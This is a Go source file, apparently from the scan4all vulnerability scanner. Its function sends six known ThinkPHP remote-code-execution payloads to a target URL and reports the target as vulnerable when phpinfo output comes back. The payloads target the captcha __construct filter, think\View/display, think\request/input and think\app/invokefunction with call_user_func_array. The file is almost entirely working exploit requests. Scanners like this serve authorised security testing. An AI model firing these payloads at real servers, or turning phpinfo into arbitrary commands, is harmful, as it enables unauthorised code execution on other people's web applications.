package ThinkPHP

import (
	"fmt"
	"github.com/hktalent/scan4all/pkg"
)

func RCE(u string) bool {
	if req, err := pkg.HttpRequset(u+"/index.php?s=captcha", "POST", "_method=__construct&filter[]=phpinfo&server[REQUEST_METHOD]=1", false, nil); err == nil {
		if pkg.StrContains(req.Body, "PHP Version") {
			pkg.GoPocLog(fmt.Sprintf("Found vuln ThinkPHP RCE|\"%s\"\n", u+"/index.php?s=captcha"))
			return true
		}
	}
	if req, err := pkg.HttpRequset(u+"/index.php?s=captcha", "POST", "_method=__construct&method=GET&filter[]=phpinfo&get[]=1", false, nil); err == nil {
		if pkg.StrContains(req.Body, "PHP Version") {
			pkg.GoPocLog(fmt.Sprintf("Found vuln ThinkPHP RCE|\"%s\"\n", u+"/index.php?s=captcha"))
			return true
		}
	}
	if req, err := pkg.HttpRequset(u+"/index.php?s=captcha", "POST", "s=1&_method=__construct&method&filter[]=phpinfo", false, nil); err == nil {
		if pkg.StrContains(req.Body, "PHP Version") {
			pkg.GoPocLog(fmt.Sprintf("Found vuln ThinkPHP RCE|\"%s\"\n", u+"/index.php?s=captcha"))
			return true
		}
	}
	if req, err := pkg.HttpRequset(u+"/index.php?s=index/\\think\\View/display&content=%22%3C?%3E%3C?php%20phpinfo();?%3E&data=1", "GET", "", false, nil); err == nil {
		if pkg.StrContains(req.Body, "PHP Version") {
			pkg.GoPocLog(fmt.Sprintf("Found vuln ThinkPHP RCE|\"%s\"\n", u+"/index.php?s=index/\\think\\View/display&content=%22%3C?%3E%3C?php%20phpinfo();?%3E&data=1"))
			return true
		}
	}
	if req, err := pkg.HttpRequset(u+"/index.php?s=index/think\\request/input?data[]=1&filter=phpinfo", "GET", "", false, nil); err == nil {
		if pkg.StrContains(req.Body, "PHP Version") {
			pkg.GoPocLog(fmt.Sprintf("Found vuln ThinkPHP RCE|\"%s\"\n", u+"/index.php?s=index/think\\request/input?data[]=1&filter=phpinfo"))
			return true
		}
	}
	if req, err := pkg.HttpRequset(u+"/index.php?s=index/\\think\\app/invokefunction&function=call_user_func_array&vars[0]=phpinfo&vars[1][]=1", "GET", "", false, nil); err == nil {
		if pkg.StrContains(req.Body, "PHP Version") {
			pkg.GoPocLog(fmt.Sprintf("Found vuln ThinkPHP RCE|\"%s\"\n", u+"/index.php?s=index/\\think\\app/invokefunction&function=call_user_func_array&vars[0]=phpinfo&vars[1][]=1"))
			return true
		}
	}
	return false
}
